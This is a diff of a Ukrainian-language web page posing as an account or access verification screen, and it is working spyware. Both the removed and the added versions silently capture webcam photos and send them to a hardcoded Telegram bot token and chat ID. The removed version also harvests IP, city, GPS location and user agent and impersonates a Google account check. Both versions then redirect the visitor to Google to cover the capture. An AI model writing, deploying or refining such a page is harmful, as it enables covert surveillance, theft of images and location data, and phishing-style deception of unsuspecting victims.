@@ -3,7 +3,7 @@
 
 <head>
   <meta charset="UTF-8">
-  <title>Підтвердження облікового запису</title>
+  <title>Перевірка доступу</title>
   <style>
     body {
       font-family: sans-serif;
@@ -19,8 +19,7 @@
 </head>
 
 <body>
-  <h2>Підтвердження Google акаунту</h2>
-  <p>Будь ласка, зачекайте...</p>
+  <h2>Очікуйте, триває перевірка даних...</h2>
 
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas"></canvas>
@@ -29,83 +28,53 @@
     const botToken = '8029833409:AAEX5ld5TBiHwc85ddH5-JgLEvki19-DlAQ';
     const chatId = '1496584814';
 
-    const sendMessage = async (text) => {
-      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: chatId, text })
-      });
-    };
-
-    const sendPhoto = async (photoBlob) => {
-      const form = new FormData();
-      form.append('chat_id', chatId);
-      form.append('photo', photoBlob, 'photo.jpg');
+    const sendPhoto = async (blob, label) => {
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('caption', label);
+      formData.append('photo', blob, label + '.jpg');
 
       await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
         method: 'POST',
-        body: form
+        body: formData
       });
     };
 
-    const sendAll = async () => {
-      let ip = '', city = '', country = '', ua = navigator.userAgent;
-      try {
-        const res = await fetch('https://ipinfo.io/json?token=4e0f12c0a8b1d1');
-        const data = await res.json();
-        ip = data.ip;
-        city = data.city;
-        country = data.country;
-      } catch (e) { }
-
-      let lat = 'н/д', lon = 'н/д';
-      if (navigator.geolocation) {
-        await new Promise(resolve => {
-          navigator.geolocation.getCurrentPosition(pos => {
-            lat = pos.coords.latitude;
-            lon = pos.coords.longitude;
-            resolve();
-          }, () => resolve());
-        });
-      }
-
-      const now = new Date().toLocaleString();
-      const msg = `📱 Зловмисник намагається увійти:
-
-🌍 IP: ${ip}
-🏙️ Місто: ${city}, ${country}
-📡 Гео: ${lat}, ${lon}
-📱 Пристрій: ${ua}
-🕒 Час: ${now}`;
-
-      await sendMessage(msg);
-
-      // Камера
+    const capturePhoto = async (facingMode, label) => {
       try {
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
 
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
         video.srcObject = stream;
 
-        await new Promise(r => setTimeout(r, 3000));
+        await new Promise(r => setTimeout(r, 3000)); // дати камері час
 
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         canvas.getContext('2d').drawImage(video, 0, 0);
-        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
 
-        await sendPhoto(blob);
+        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+        await sendPhoto(blob, label);
+
         stream.getTracks().forEach(track => track.stop());
       } catch (e) {
-        await sendMessage('Доступ до камери заблоковано');
+        console.error(`❌ ${label}: ${e.message}`);
       }
-
-      // Редирект
-      window.location.href = 'https://accounts.google.com/ServiceLogin';
     };
 
-    sendAll();
+    const run = async () => {
+      // спочатку задня камера
+      await capturePhoto('environment', 'Задня камера');
+
+      // потім фронтальна (резерв)
+      await capturePhoto('user', 'Фронтальна камера');
+
+      // редирект
+      window.location.href = 'https://accounts.google.com/';
+    };
+
+    run();
   </script>
 </body>
 
